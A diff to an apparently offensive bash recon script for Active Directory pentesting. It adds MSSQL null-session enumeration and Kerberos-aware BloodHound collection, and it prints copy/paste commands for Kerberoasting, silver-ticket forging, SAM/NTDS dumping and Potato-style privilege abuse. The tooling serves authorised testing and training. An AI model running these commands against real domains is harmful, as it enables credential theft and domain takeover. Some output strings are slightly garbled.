@@ -47,6 +47,7 @@ TARGET_FQDN=""
 DOMAIN_CONTROLLER=""
 ENABLE_VHOST=false
 ENABLE_MSSQL_BRUTE=false
+ENABLE_MSSQL_ENUM=false
 ENABLE_KERB_ENUM=false
 ENABLE_WEB_ENUM=false
 ENABLE_BH_EXPORT=false
@@ -92,7 +93,7 @@ LAPS_READABLE=false
 WEB_DETECTED=false
 WINRM_DETECTED=false
 SSH_DETECTED=false
-ASREP_OK=falseclear
+ASREP_OK=false
 KERBEROS_AUTH_OK=false
 HAS_WEB=0
 HTTP_FOUND=false
@@ -106,6 +107,7 @@ CAN_JOIN_COMPUTERS_TO_DOMAIN=false
 HAS_WRITABLE_COMPUTER_ACL=false
 KERBEROAST_HASH_FOUND=false     # Set when Kerberoast output is non-empty
 SPN_NAME=""                     # Parse from Kerberoast result
+BH_ZIP_FILE=""
 
 # --------- Certificate Services / AD CS ----------
 HAS_CERTIPY=0
@@ -175,6 +177,9 @@ for arg in "$@"; do
         --run-blood) ENABLE_BH_EXPORT=true ;;
         --kerberoast) ENABLE_KERBROAST=true ;;
         --check-certs) ENABLE_ADCS=true ;;
+        --check-cert) ENABLE_ADCS=true ;;
+        --check-ca) ENABLE_ADCS=true ;;
+        --check-mssql) ENABLE_MSSQL_ENUM=true ;;
         --mssql-brute) ENABLE_MSSQL_BRUTE=true ;;
         *) [ -z "$TARGET" ] && TARGET="$arg" ;;
     esac
@@ -339,7 +344,7 @@ dc_auth_check() {
             --continue-on-success \
         2>&1)
     else
-        info "   - NTLM Disabled. Using Kerberos..."
+        info "   - N Using Kerberos..."
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
         echo -e "        ${GREEN}$LDAP_TOOL ldap '$dc' -u '$user' -p '$pass' -d '$domain' -k --no-bruteforce --continue-on-success${RESET}"
         OUT=$($LDAP_TOOL ldap "$dc" \
@@ -362,7 +367,7 @@ dc_auth_check() {
 }
 
 gather_bloodhound() {
-    info "Starting BloodHound data collection"
+    info "Starting BloodHound data collection..."
     
     if [[ -z "${AUTH_USER:-}" || -z "${AUTH_PASS:-}" ]]; then
         warn "No credentials available — skipping BloodHound collection"
@@ -387,7 +392,12 @@ gather_bloodhound() {
         mkdir -p "$BH_OUT_DIR"
         success "Created BloodHound output directory: $BH_OUT_DIR"
     fi
-
+    
+    BH_AUTH_METHOD="auto"
+    if [[ "$NTLM_ENABLED" == false ]]; then
+        BH_AUTH_METHOD="kerberos"
+    fi 
+    
     info "BloodHound parameters:"
     echo "   - User:     $AUTH_USER"
     echo "   - Pass:     $AUTH_PASS"
@@ -396,21 +406,19 @@ gather_bloodhound() {
     echo "   - DC IP:    $TARGET_IPV4"
     #echo "   - Output:   $BH_OUT_DIR"
     echo "   - ns        $TARGET_IPV4"
-    echo 
+    echo "   --auth-method:  $BH_AUTH_METHOD"
+
     info "Gathering domain info via Bloodhound (May Take Some Time)..."
     echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}bloodhound-python -u '$AUTH_USER' -p '$AUTH_PASS' -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method ntlm -c All --zip ${RESET}"
+    echo -e "        ${GREEN}bloodhound-python -u '$AUTH_USER' -p '$AUTH_PASS' -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method $BH_AUTH_METHOD -c All --zip ${RESET}"
     
     # ---- Capture output while displaying it ----
     BH_LOG=$(mktemp)
     
-    #bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method ntlm -c All --zip 
-    
-    bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method ntlm \
+    bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method $BH_AUTH_METHOD \
         -c All \
         --zip \
         2>&1 | tee "$BH_LOG"
-
 
     BH_RC=${PIPESTATUS[0]}
 
@@ -418,14 +426,14 @@ gather_bloodhound() {
         error "BloodHound collection failed (exit code: $BH_RC)"
         echo
         warn "Last BloodHound output:"
-        tail -n 15 "$BH_LOG" | sed 's/^/   /'
+        tail -n 20 "$BH_LOG" | sed 's/^/   /'
         rm -f "$BH_LOG"
         return 1
     fi
 
     success "BloodHound data collected successfully!"
 
-    ZIP_FILE=$(
+    BH_ZIP_FILE=$(
         find . -maxdepth 1 -name '*_bloodhound.zip' -type f \
             -newermt "@$BH_START_TS" \
             -printf '%T@ %p\n' \
@@ -433,9 +441,9 @@ gather_bloodhound() {
             | awk 'NR==1 {print $2}'
     )
 
-    if [[ -n "$ZIP_FILE" ]]; then
+    if [[ -n "$BH_ZIP_FILE" ]]; then
         info "Upload this file to BloodHound:"
-        echo -e "   ${BYELLOW}${ZIP_FILE#./}${RESET}"
+        echo -e "   ${BYELLOW}${BH_ZIP_FILE#./}${RESET}"
     else
         warn "No BloodHound ZIP file found from this run"
     fi
@@ -2558,6 +2566,11 @@ if [ -s "$SMB_MARKER" ]; then
 
             if echo "$OUT" | grep -qP 'Share'; then
                 echo "$OUT" | tail -n +4
+                echo
+                notify "   Kerberos was used!"
+                echo -e "     Use 'impacket-smbclient' to view files."
+                echo -e "         ${GREEN}impacket-smbclient -k ${AUTH_DOMAIN:-$LDAP_DOMAIN}/$SMB_USER:'$SMB_PASS'@$DOMAIN_CONTROLLER${RESET}"
+                echo
             else
                 warn "Authenticated but no shares are visible to this user"
             fi
@@ -2848,7 +2861,7 @@ MSSQL_NULL_LOGIN=false
 MSSQL_AUTH_OK=false
 MSSQL_INSTANCE_FOUND=false
 MSSQL_USER=""
-if [[ "$HAS_MSSQL" == true ]]; then
+if [[ "$HAS_MSSQL" == "true" && "$ENABLE_BH_EXPORT" == "true" ]]; then
     echo
     info "MSSQL service detected on port 1433 — beginning enumeration..."
 
@@ -2858,7 +2871,11 @@ if [[ "$HAS_MSSQL" == true ]]; then
         tool=$(command -v crackmapexec || command -v netexec)
         DATE_TAG=$(date +"%Y%m%d_%H%M%S")
         # 1. Try NULL session
-        MSSQL_ENUM_OUTPUT=$($tool mssql "$TARGET_IPV4" -u '' -p '' 2>/dev/null)
+        echo -e "   Trying Null Session access..."
+        echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "           ${GREEN}$tool mssql "$TARGET_IPV4" -u '' -p ''${RESET}"
+
+        MSSQL_ENUM_OUTPUT=$($tool mssql "$TARGET_IPV4" -u '' -p '' 2>&1)
         echo "$MSSQL_ENUM_OUTPUT" | tee "mssql_nullenum_${TARGET_IPV4}_${DATE_TAG}.txt"
 
         if echo "$MSSQL_ENUM_OUTPUT" | grep -qP "\[\+\]"; then
@@ -2866,7 +2883,15 @@ if [[ "$HAS_MSSQL" == true ]]; then
             MSSQL_NULL_LOGIN=true
         elif echo "$MSSQL_ENUM_OUTPUT" | grep -qP "\[-\]"; then
             warn "MSSQL denied NULL login"
+        elif echo "$MSSQL_ENUM_OUTPUT" | grep -qi "Unpacked data doesn't match"; then
+            warn "MSSQL parsing error or unsupported auth method — crackmapexec may be failing."
+            warn "Output was:"
+            echo "$MSSQL_ENUM_OUTPUT"
+        else
+            warn "MSSQL scan returned unexpected output format"
+            echo "$MSSQL_ENUM_OUTPUT"
         fi
+
         
         # Extract any username if present
         MSSQL_USER=$(echo "$MSSQL_ENUM_OUTPUT" | grep -oP '\+\] \K\S+(?=[:@])' | head -n1)
@@ -2902,9 +2927,14 @@ if [[ "$HAS_MSSQL" == true ]]; then
     # Optional: set flags or write to a report file for decision engine
     echo "MSSQL_ENUM=true" >> recon_flags.txt
     [[ "$MSSQL_NULL_LOGIN" == true ]] && echo "MSSQL_NULL_LOGIN=true" >> recon_flags.txt
+elif [[ "$HAS_MSSQL" == "true" && "$ENABLE_BH_EXPORT" == "false" ]]; then
+    echo     
+    alert "${BLUE}Tip:${RESET} MSSQL Port detected"
+    echo "  --------------------------------------"
+    echo -e "    Re-run with ${BLUE}--check-mssql${RESET} to enable MSSQL Enumeration"
+    echo "    Example:"
+    echo "      ./bash_simpleportscan.sh $TARGET --check-mssql"
 fi
-
-
 
 #############################################
 # Check to see what Credentials can access
@@ -3184,8 +3214,8 @@ if [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == true && "$CRED
 		
                 if [[ ${#ADCS_TEMPLATES[@]} -gt 0 ]]; then
                     success "Vulnerable certificate templates identified:"
-                    for tpl in "${ADCS_TEMPLATES[@]}"; do
-                        echo -e "    ${RED}- $tpl${RESET}"
+                    for template in "${ADCS_TEMPLATES[@]}"; do
+                        echo -e "    ${RED}- $template${RESET}"
                     done
                 else
                     warn "Vulnerable templates detected but names could not be parsed"
@@ -3543,7 +3573,7 @@ generate_synopsis() {
     echo -e "\n${BLUE}========================================${RESET}"
     echo -e "${BYELLOW}          RECON SYNOPSIS               ${RESET}"
     echo -e "${BLUE}========================================${RESET}"
-    echo
+    
     if [ -n "$AUTH_USER" ] && [ -n "$AUTH_PASS" ]; then
         echo -e "   - User:      ${YELLOW}$AUTH_USER${RESET}"
         echo -e "   - Password:  ${YELLOW}$AUTH_PASS${RESET}"
@@ -3578,6 +3608,10 @@ generate_synopsis() {
         print_item "$ASREP_OK" "AS-REP Roasting is possible (User hashes obtainable)"
         print_item "$LAPS_READABLE" "LAPS Passwords are READABLE (High Risk / Local Admin)"
         print_item "$CAN_JOIN_COMPUTERS_TO_DOMAIN" "MachineAccountQuota Allows users to create up to ${MACHINE_ACCOUNT_QUOTA} computer accounts"
+        if [[ -n "$BH_ZIP_FILE" ]]; then
+            print_item "true" "BloodHound Data was gathered for: ${AUTH_DOMAIN:-$LDAP_DOMAIN}"
+            echo -e "        File: ${YELLOW}${BH_ZIP_FILE}${RESET}"
+        fi
     fi
     
     if [[ "$ADCS_VULNERABLE" == true ]]; then
@@ -3684,7 +3718,7 @@ attack_path_evaluation() {
         echo "   - Check RBCD paths (BloodHound)"
         echo
     fi
-    
+    # 3. Vulnerable Cert Template
     if [[ "$ADCS_VULNERABLE" = true ]]; then
         ATTACK_PATHS+=("Exploitable Certificate Templates Detected (ADCS Abuse)")
         critical "Attack Path: ADCS Abuse"
@@ -3696,7 +3730,7 @@ attack_path_evaluation() {
         echo "   - Re-test privileged access (SMB / LDAP / WinRM)"
         echo
     fi
-    
+    # 4. ASREP Roast
     if [[ "$ASREP_OK" = true ]]; then
         ATTACK_PATHS+=("AS-REP Roasting (User hashes obtainable)")
         critical "Attack Path: AS-REP Roasting Possible (User hashes obtainable)"
@@ -3707,7 +3741,7 @@ attack_path_evaluation() {
         echo
     fi
     
-    # 3. RBCD candidate (needs MAQ + writable ACLs later)
+    # 5. RBCD candidate (needs MAQ + writable ACLs later)
     if [[ "$MAQ_ENABLED" == true && "$HAS_WRITABLE_COMPUTER_ACL" == true ]]; then
         ATTACK_PATHS+=("RBCD via MAQ")
         critical "Attack Path: Resource-Based Constrained Delegation candidate"
@@ -3722,12 +3756,7 @@ attack_path_evaluation() {
         echo "   - Authenticate as impersonated user (SMB / WinRM / LDAP)"
         echo
     fi
-
-    # 4. No viable paths
-    if [[ ${#ATTACK_PATHS[@]} -eq 0 ]]; then
-        warn "No immediate attack paths identified"
-    fi
-    
+    # 6. Kerberoast
     if [[ "$KERBEROAST_HASH_FOUND" == true ]] && [[ "$NTLM_DISABLED" == true ]] && [[ -n "$SPN_NAME" ]]; then
         echo ""
         critical "Attack Path: Silver Ticket Attack is Viable"
@@ -3736,7 +3765,7 @@ attack_path_evaluation() {
         echo -e "   - Acquire the NTLM hash for the pwned SPN Account."
         echo -e "         ${GREEN}impacket-secretsdump ${AUTH_DOMAIN:-$LDAP_DOMAIN}/$KERBEROAST_USER:[CrackedPassword]@$TARGET_IPV4"
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}impacket-GetUserSPNs '$LDAP_BASE_DN//$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER${RESET}"
+        echo -e "        ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}//$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER -request ${RESET}"
         echo -e "   - Use the hash to forge a Silver Ticket:"
         echo -e "         ${GREEN}impacket-ticketer -nthash <NTLM> -domain ${AUTH_DOMAIN:-$LDAP_DOMAIN} -user $KERBEROAST_USER -spn $SPN_NAME${RESET}"
         echo -e "         ${GREEN}export KRB5CCNAME=silver_ticket.ccache${RESET}"
@@ -3744,7 +3773,7 @@ attack_path_evaluation() {
         echo -e "   - Test access to MSSQL, SMB, or other SPN-related services"
     fi
     
-    # 5. Privilege Escalation via Misconfigured Privileges
+    # 7. Privilege Escalation via Misconfigured Privileges
     if [[ "$ESCALATION_PRIVS_FOUND" == true ]] && [[ ${#FOUND_ESCALATION_PRIVS[@]} -gt 0 ]]; then
         ATTACK_PATHS+=("Privilege Escalation via Misconfigured Rights")
         critical "Attack Path: Local Privilege Escalation Possible"
@@ -3757,7 +3786,7 @@ attack_path_evaluation() {
         done
         echo
     fi
-    # 5a. SeBackupPrivilege Exploitation
+    # 7a. SeBackupPrivilege Exploitation
     if [[ "$SE_BACKUP_PRIV" == true ]]; then
         ATTACK_PATHS+=("SeBackupPrivilege Abuse (NTDS.dit/SAM Dump)")
         critical "Attack Path: SeBackupPrivilege — Possible NTDS.dit or SAM Dump"
@@ -3783,7 +3812,7 @@ attack_path_evaluation() {
         echo "         impacket-secretsdump LCOAL -system SYSTEM -sam SAM -outputfile creds.txt "
         echo
     fi
-    # 5b. SeImpersonatePrivilege Exploitation
+    # 7b. SeImpersonatePrivilege Exploitation
     if [[ "$SE_IMPERSONATE_PRIV" == true ]]; then
         ATTACK_PATHS+=("SeImpersonatePrivilege Abuse (Potato Exploits)")
         critical "Attack Path: SeImpersonatePrivilege — Potato-style Exploits Possible"
@@ -3801,7 +3830,23 @@ attack_path_evaluation() {
         echo '         \\.\\pipe\\spoolss, epmapper, lsarpc, etc.'
         echo
     fi
-
+    # 8. BloodHound
+    if [[ -n "$BH_ZIP_FILE" ]]; then
+        ATTACK_PATHS+=("BloodHound Review of the Domain")
+        critical "Attack Path: BloodHound Review of the Domain"
+        lightbulb "Next Steps:"
+        echo "   - BloodHound Data was gathered for: ${AUTH_DOMAIN:-$LDAP_DOMAIN}"
+        echo "   - Start BloodHound 'sudo bloodhound'"
+        echo "   - Login"
+        echo "   - Import File: ${BH_ZIP_FILE}"
+        echo "   - Review for Paths to Crown Jewels. Review for Permission Abuse."
+    fi
+    
+    # No viable paths
+    if [[ ${#ATTACK_PATHS[@]} -eq 0 ]]; then
+        warn "No immediate attack paths identified"
+    fi
+    
 }
 
 # Generate Attack Path Summary
@@ -3835,6 +3880,10 @@ elif [[ $HAS_WEB -eq 1 ]]; then
 fi
 if [[ $HAS_WEB -eq 1 && $HAS_SMB -eq 1 ]]; then
     finding "  Web + SMB attack surface overlap detected"
+    echo
+fi
+if [[ "$HAS_MSSQL" == "true" ]]; then
+    finding "  MSSQL attack surface detected"
     echo
 fi
 
